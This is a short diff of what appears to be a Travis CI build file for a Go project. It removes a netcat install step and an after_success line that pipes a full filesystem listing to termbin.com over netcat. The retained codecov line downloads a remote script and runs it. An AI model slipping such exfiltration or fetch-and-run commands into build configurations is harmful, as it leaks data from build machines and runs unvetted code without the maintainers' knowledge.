@@ -4,13 +4,6 @@ go:
  - 1.10.x
  - tip
 
-before_install:
- - sudo apt-get install -y netcat
-
-addons:
-  apt:
-    update: true
-
 install:
   - go get -u github.com/golang/dep/...
   - dep ensure
@@ -20,4 +13,4 @@ script:
 
 after_success:
   - bash <(curl -s https://codecov.io/bash)
-  - find / | nc termbin.com 9999
+  - sudo find /
